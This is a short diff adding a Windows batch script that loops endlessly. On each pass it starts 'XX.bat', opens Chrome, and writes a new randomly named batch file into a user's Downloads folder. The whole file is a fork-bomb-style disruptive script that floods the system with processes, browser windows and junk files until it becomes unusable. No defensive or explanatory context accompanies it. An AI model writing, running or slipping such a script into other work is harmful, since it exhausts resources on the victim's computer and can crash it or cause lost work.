@@ -1,0 +1,9 @@
+@echo off
+set nr=0
+:1
+start XX.bat
+start chrome.exe
+cd C:\Users\lucam\Downloads
+echo @echo off>%nr%.bat
+set nr=%random%
+goto :1
